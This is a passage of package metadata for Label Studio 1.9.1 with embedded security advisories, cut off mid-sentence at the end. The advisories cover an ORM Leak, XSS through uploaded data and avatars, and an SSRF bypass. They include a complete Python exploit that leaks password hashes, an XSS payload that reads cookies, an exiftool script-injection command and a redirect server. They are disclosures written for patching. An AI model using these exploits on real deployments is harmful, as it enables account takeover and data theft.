will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.9.1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.9.1/","requires_dist":["wheel (<=0.40.0,>=0.38.1)","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (==1.16.28)","botocore (==1.19.28)","bleach (~=5.0.0)","google-api-core (==2.11.0)","google-auth (==2.14.1)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==2.3.2)","google-cloud-storage (~=2.5.0)","google-cloud-logging (~=2.7.0)","google-resumable-media (==2.3.3)","googleapis-common-protos (==1.56.4)","grpc-google-iam-v1 (==0.12.4)","Django (==3.2.20)","django-storages (==1.12.3)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-environ (==0.10.0)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.5.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","djangorestframework (==3.13.1)","drf-flex-fields (==0.9.5)","humansignal-drf-yasg (>=1.21.9)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","defusedxml (>=0.7.1)","numpy (==1.24.3)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (<4.0.0,>=3.15.5)","psycopg2-binary (==2.9.6)","pydantic (<=1.11.0,>=1.7.3)","python-dateutil (>=2.8.1)","pytz (~=2022.1)","requests (==2.31.0)","urllib3 (==1.26.16)","rq (==1.10.1)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (~=3.5)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk (==7.5.0)","python-json-logger (==2.0.4)","label-studio-converter (==0.0.55)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.9.1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"b47825561a16d3847ac0685fbd37ffb9978313ca0438cb98a6b5ea66e8b360e5","md5":"820d30839b4a302a16a69bf4c9c0dcb0","sha256":"fc0f1202e7a25cc4da54af6682698e9c68abe8977f4be15043f53178d6c00344"},"downloads":-1,"filename":"label_studio-1.9.1-py3-none-any.whl","has_sig":false,"md5_digest":"820d30839b4a302a16a69bf4c9c0dcb0","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":57795343,"upload_time":"2023-10-10T17:36:18","upload_time_iso_8601":"2023-10-10T17:36:18.067388Z","url":"https://files.pythonhosted.org/packages/b4/78/25561a16d3847ac0685fbd37ffb9978313ca0438cb98a6b5ea66e8b360e5/label_studio-1.9.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"c72e74c227c28281e4e94745517721ae8636b40c7797a6d2ff86a06a1db4abd4","md5":"53d21baf2fdfb0cfe076ed70e614e1ff","sha256":"a921ea50e3c5a1c882c99b65a125e78c0e111f7f0ccd62b78cd17234bc823cf6"},"downloads":-1,"filename":"label-studio-1.9.1.tar.gz","has_sig":false,"md5_digest":"53d21baf2fdfb0cfe076ed70e614e1ff","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":56669906,"upload_time":"2023-10-10T17:36:23","upload_time_iso_8601":"2023-10-10T17:36:23.687819Z","url":"https://files.pythonhosted.org/packages/c7/2e/74c227c28281e4e94745517721ae8636b40c7797a6d2ff86a06a1db4abd4/label-studio-1.9.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute 